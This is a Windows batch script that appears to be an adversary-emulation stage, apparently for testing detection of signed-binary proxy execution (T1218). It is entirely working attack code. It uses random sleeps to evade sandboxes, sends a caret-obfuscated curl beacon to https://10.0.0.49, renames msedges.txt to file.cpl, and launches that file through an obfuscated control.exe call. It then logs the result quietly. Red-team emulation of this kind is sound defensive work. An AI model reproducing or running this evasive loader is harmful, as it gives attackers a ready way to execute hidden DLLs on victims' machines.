@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random variable names with PHR_ as values
SET yktnwwf=%APPDATA%\7641\13bfccc6
SET fpakbq=Macula-Stage0-7641
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?7641-10
SET omxgazu=BALAM-S2BO
SET yydue=10
SET edjwtl=msedges.txt
SET fpldhe=7641

REM Random variables for computed values
SET zxddff=%TEMP%
SET qwmnb=%APPDATA%
SET bqkjp=%TIME%
SET nmltrf=%DATE%
SET vbzhu=0
SET vqczl=
SET gfdht=1

REM Initial delay (45-60s)
timeout /t 5 /nobreak >nul
ping -n 8 127.0.0.1 >nul
SET /A kjhsdf=%RANDOM% %% 16 + 30
timeout /t %kjhsdf% /nobreak >nul

REM Create log directory if needed
IF NOT EXIST "!qwmnb!\!yydue!\" (
    md "!qwmnb!\!yydue!" 2>nul
)

REM Check server availability (heartbeat) with escaped curl
SET cmd1=c^u^r^l
SET cmd2= -^k -^s -^o n^u^l
SET cmd3= "!rdzgrnne!"
!cmd1!!cmd2!!cmd3! 2>nul

REM Random delay
ping -n 3 127.0.0.1 >nul
CHOICE /C Y /N /D Y /T 8 >nul

REM Rename DLL to CPL
IF EXIST "!yktnwwf!\!edjwtl!" (
    SET src=!yktnwwf!\!edjwtl!
    SET dst=!yktnwwf!\file.cpl
    copy /Y "!src!" "!dst!" >nul 2>&1
    IF !ERRORLEVEL! EQU 0 (
        SET vbzhu=1
    ) ELSE (
        SET vqczl=copy_failed
    )
) ELSE (
    SET vqczl=source_missing
)

REM Delay before execution
ping -n 4 127.0.0.1 >nul

REM Execute CPL with escaped control.exe
IF EXIST "!yktnwwf!\file.cpl" (
    SET lol1=c^o^n^t^r^o^l
    SET lol2=.^e^x^e
    SET arg1= "!yktnwwf!\file.cpl"
    FOR /F "tokens=*" %%a IN ('echo !lol1!!lol2!') DO SET exe=%%a
    CALL !exe!!arg1! 2>nul
    IF !ERRORLEVEL! EQU 0 (
        SET vbzhu=1
    ) ELSE (
        SET vqczl=execution_failed
    )
) ELSE (
    SET vqczl=cpl_missing
)

REM Build timestamp
SET tnmp=!nmltrf:~-4!-!nmltrf:~-10,2!-!nmltrf:~-7,2!
SET tmmp=!bqkjp:~0,8!.!bqkjp:~9,3!
SET logline=[!tnmp! !tmmp!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!vbzhu!:!vqczl!

REM Append log with error suppression
echo !logline! >> "!qwmnb!\!yydue!\macula-simulations.log" 2>nul || (
    REM Silent failure
)

REM Final random delay
SET /A delay=%RANDOM% %% 15 + 10
timeout /t %delay% /nobreak >nul

ENDLOCAL